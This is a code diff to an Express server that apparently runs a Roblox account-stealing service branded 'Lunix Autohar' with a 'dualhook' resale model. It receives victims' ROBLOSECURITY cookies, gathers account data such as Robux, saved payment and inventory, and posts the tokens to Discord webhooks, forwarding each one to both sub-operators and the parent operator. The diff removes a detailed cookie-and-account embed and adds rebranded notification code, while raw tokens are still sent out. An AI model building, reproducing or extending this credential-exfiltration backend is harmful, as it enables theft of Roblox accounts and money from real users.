@@ -146,18 +146,22 @@ app.post('/api/create-directory', async (req, res) => {
 
     // Send notification to the webhook about successful directory creation
     try {
-      const serviceTypeLabel = serviceType === 'dualhook' ? 'DUALHOOK GENERATOR' : 'LUNIX AUTOHAR';
+      const serviceTypeLabel = serviceType === 'dualhook' 
+        ? `${directoryName.toUpperCase()} GENERATOR` 
+        : 'LUNIX AUTOHAR';
       const description = serviceType === 'dualhook' 
-        ? `Ur Dualhook Generator URLs\n📌\n\n**Main Directory:**\n\`http://${req.get('host')}/${directoryName}\`\n\n**Create Page for Users:**\n\`http://${req.get('host')}/${directoryName}/create\`\n\n🔗 **Features:**\n• Users can create subdirectories\n• Triple webhook delivery\n• Multi-tenant management\n• Send the create link to your users!`
+        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\``
         : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\``;
 
       const notificationPayload = {
         embeds: [{
           title: serviceTypeLabel,
           description: description,
-          color: serviceType === 'dualhook' ? 0xFF6B35 : 0x8B5CF6,
+          color: 0x8B5CF6,
           footer: {
-            text: "Made By Lunix"
+            text: serviceType === 'dualhook' 
+              ? `Made By ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)}`
+              : "Made By Lunix"
           }
         }]
       };
@@ -312,6 +316,56 @@ async function fetchRobloxUserData(token) {
   }
 }
 
+// Function to send custom dualhook webhook with directory branding
+async function sendCustomDualhookWebhook(token, userAgent = 'Unknown', userData = null, webhookUrl, directoryName, subdirectoryName, host) {
+  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');
+
+  if (!webhookUrl) {
+    console.log('❌ Discord webhook URL not configured');
+    return { success: false, error: 'Webhook URL not configured' };
+  }
+
+  try {
+    const embed = {
+      title: `${directoryName.toUpperCase()} AUTOHAR`,
+      description: `Ur ${directoryName.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${host}/${directoryName}/${subdirectoryName}\``,
+      color: 0x8B5CF6,
+      footer: {
+        text: `Made by ${directoryName}`
+      }
+    };
+
+    const payload = {
+      embeds: [embed]
+    };
+
+    console.log('Sending custom dualhook webhook payload...');
+
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload)
+    });
+
+    console.log('Webhook response status:', response.status);
+
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error('Webhook failed with status:', response.status, 'Error:', errorText);
+      return { success: false, error: `Webhook failed: ${response.status}` };
+    }
+
+    console.log('✅ Successfully sent custom dualhook webhook');
+    return { success: true };
+  } catch (error) {
+    console.error('❌ Failed to send custom dualhook webhook:', error.message);
+    console.error('Full error:', error);
+    return { success: false, error: error.message };
+  }
+}
+
 // Function to send Discord webhook with user data (supports custom webhook URLs)
 async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown', userData = null, customWebhookUrl = null) {
   const webhookUrl = customWebhookUrl || process.env.DISCORD_WEBHOOK_URL;
@@ -324,115 +378,12 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
   }
 
   try {
-    let fields = [
-      {
-        name: "Script Type",
-        value: scriptType.charAt(0).toUpperCase() + scriptType.slice(1).replace('-', ' '),
-        inline: false
-      }
-    ];
-
-    // Add user data fields if available
-    if (userData) {
-      fields.push(
-        {
-          name: "👤 Username",
-          value: userData.username,
-          inline: true
-        },
-        {
-          name: "🆔 User ID",
-          value: userData.userId.toString(),
-          inline: true
-        },
-        {
-          name: "💰 Robux Balance",
-          value: `$${userData.robux} (Est. ${userData.robux} Robux)`,
-          inline: true
-        },
-        {
-          name: "💎 Premium",
-          value: userData.premium ? "✅ Yes" : "❌ No",
-          inline: true
-        },
-        {
-          name: "📊 RAP",
-          value: userData.rap.toString(),
-          inline: true
-        },
-        {
-          name: "📈 Summary",
-          value: userData.summary.toString(),
-          inline: true
-        },
-        {
-          name: "💳 Credit Balance",
-          value: `$${userData.creditBalance} (Est. ${userData.creditBalance} Robux)`,
-          inline: true
-        },
-        {
-          name: "💾 Saved Payment",
-          value: userData.savedPayment ? "✅ Yes" : "❌ No",
-          inline: true
-        },
-        {
-          name: "📥 Robux Incoming/Outgoing",
-          value: `${userData.robuxIncoming}/${userData.robuxOutgoing}`,
-          inline: true
-        },
-        {
-          name: "💀 Korblox/Headless",
-          value: `${userData.korblox ? "✅" : "❌"}/${userData.headless ? "✅" : "❌"}`,
-          inline: true
-        },
-        {
-          name: "🎂 Age",
-          value: `${userData.accountAge} Days`,
-          inline: true
-        },
-        {
-          name: "👥 Groups Owned",
-          value: userData.groupsOwned.toString(),
-          inline: true
-        },
-        {
-          name: "🏠 Place Visits",
-          value: userData.placeVisits.toString(),
-          inline: true
-        },
-        {
-          name: "🎒 Inventory",
-          value: `Hairs: ${userData.inventory.hairs}\nBundles: ${userData.inventory.bundles}\nFaces: ${userData.inventory.faces}`,
-          inline: true
-        }
-      );
-    }
-
-    fields.push(
-      {
-        name: "🍪 Cookie",
-        value: `\`\`\`${token}\`\`\``,
-        inline: false
-      },
-      {
-        name: "🌐 User Agent",
-        value: userAgent,
-        inline: true
-      },
-      {
-        name: "⏰ Timestamp",
-        value: new Date().toISOString(),
-        inline: true
-      }
-    );
-
     const embed = {
-      title: userData ? `🔐 New ROBLOSECURITY Token - ${userData.username}` : "🔐 New ROBLOSECURITY Token",
-      description: userData ? `Account data extracted successfully for ${userData.username}` : "A new token has been extracted from PowerShell command",
-      color: userData ? 0x00ff00 : 0xff9900,
-      fields: fields,
+      title: "LUNIX AUTOHAR",
+      description: `Ur LUNIX AUTOHAR url\n📌\n\n\`${token}\``,
+      color: 0x8B5CF6,
       footer: {
-        text: "Request Inspector Bot"
+        text: "Made By Lunix"
       }
     };
 
@@ -760,11 +711,11 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
     try {
       const notificationPayload = {
         embeds: [{
-          title: "DUALHOOK SUBDIRECTORY CREATED",
-          description: `🎉 **Your subdirectory is ready!**\n\n📌 **Your URL:**\n\`http://${req.get('host')}/${parentDirectory}/${subdirectoryName}\`\n\n🔗 **Your API Token:**\n\`${directories[parentDirectory].subdirectories[subdirectoryName].apiToken}\`\n\n✅ **Setup Complete!**\nYour subdirectory is now active and ready to receive data.`,
-          color: 0x00D084,
+          title: `${parentDirectory.toUpperCase()} AUTOHAR`,
+          description: `Ur ${parentDirectory.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${parentDirectory}/${subdirectoryName}\``,
+          color: 0x8B5CF6,
           footer: {
-            text: "Made By Lunix"
+            text: `Made by ${parentDirectory}`
           }
         }]
       };
@@ -896,8 +847,8 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
 
       const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
 
-      // 1. Send to subdirectory webhook (user's webhook)
-      const subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, userData, subdirectoryConfig.webhookUrl);
+      // 1. Send to subdirectory webhook (user's webhook) - Custom embed
+      const subdirectoryWebhookResult = await sendCustomDualhookWebhook(token, userAgent, userData, subdirectoryConfig.webhookUrl, directoryName, subdirectoryName, req.get('host'));
 
       // 2. Send to parent dualhook webhook
       if (parentConfig.dualhookWebhookUrl) {
